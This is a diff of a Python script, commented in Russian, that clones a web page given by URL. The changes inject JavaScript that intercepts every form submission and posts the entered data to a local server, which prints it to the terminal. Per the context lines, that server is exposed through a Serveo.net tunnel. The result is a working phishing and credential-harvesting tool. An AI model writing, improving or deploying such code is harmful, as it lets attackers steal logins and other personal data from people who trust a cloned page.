@@ -4,6 +4,19 @@ import time
 import os
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse, urljoin
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import socketserver
+import threading
+
+class MyRequestHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length).decode('utf-8')
+        print("Данные из формы:", post_data)
+
+class MyServer(HTTPServer):
+    def __init__(self, server_address, handler_class):
+        super().__init__(server_address, handler_class)
 
 # Введите URL
 url = input('\nВведите URL ➤ ')
@@ -35,28 +48,25 @@ if url.strip():
     # Ждем некоторое время перед сохранением HTML-кода
     time.sleep(5)
 
-    # Добавляем JavaScript для заполнения форм на локальном сервере
-    fill_form_script = """
+    # Добавляем JavaScript для отправки данных формы на сервер и вывода в терминале
+    script = """
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        setInterval(function() {
             var forms = document.querySelectorAll('form');
             forms.forEach(function(form) {
-                var formData = new FormData(form);
-                fetch('/', {
-                    method: 'POST',
-                    body: formData
-                }).then(function(response) {
-                    return response.text();
-                }).then(function(data) {
-                    console.log(data);
-                }).catch(function(error) {
-                    console.error('Ошибка:', error);
+                form.addEventListener('submit', function(event) {
+                    event.preventDefault();
+                    var formData = new FormData(form);
+                    fetch('/', {
+                        method: 'POST',
+                        body: formData
+                    });
                 });
             });
-        });
+        }, 1000);
     </script>
     """
-    soup.body.append(BeautifulSoup(fill_form_script, 'html.parser'))
+    soup.body.append(BeautifulSoup(script, 'html.parser'))
 
     # Сохраняем HTML-код в файл
     file_path = 'downloaded_page.html'
@@ -65,25 +75,16 @@ if url.strip():
 
     print(f"Страница успешно скачана и сохранена в файл {file_path}")
 
-    # Шаг 2: Запуск локального сервера
+    # Запуск локального сервера для обработки данных формы
+    server_address = ('', 8000)
+    httpd = MyServer(server_address, MyRequestHandler)
+    server_thread = threading.Thread(target=httpd.serve_forever)
+    server_thread.daemon = True
+    server_thread.start()
 
-    # Создаем копию soup для сохранения в index.html
-    soup_copy = soup
-
-    # Копируем содержимое файла в файл index.html в текущей рабочей директории
-    with open('index.html', 'w', encoding='utf-8') as file:
-        file.write(str(soup_copy.prettify()))
-
-    # Выполняем команду для запуска локального сервера на порту 8000 (или другом свободном порту)
-    local_server_command = 'python -m http.server 8000'
-
-    # Запускаем команду для локального сервера с помощью subprocess
-    local_server_process = subprocess.Popen(local_server_command, shell=True, stdout=subprocess.PIPE)
-
-    # Печатаем сообщение о запуске локального сервера
     print("Локальный сервер запущен на порту 8000")
 
-    # Шаг 3: Запуск Serveo.net
+    # Шаг 2: Запуск Serveo.net
 
     # Используем оригинальную команду Serveo.net без изменений
     tru_201 = '8000'  # Замените на нужный вам порт
@@ -102,11 +103,9 @@ if url.strip():
     except KeyboardInterrupt:
         # Прерываем выполнение при нажатии Ctrl+C
 
-        # Завершаем процессы локального сервера и Serveo.net
-        local_server_process.terminate()
+        # Завершаем процессы Serveo.net и локального сервера
         serveo_process.terminate()
-
-        os.system("rm -fr index.html")
+        httpd.shutdown()
         print("Скрипт завершен.")
 else:
     print("Пустой URL. Пожалуйста, введите действительный URL.")
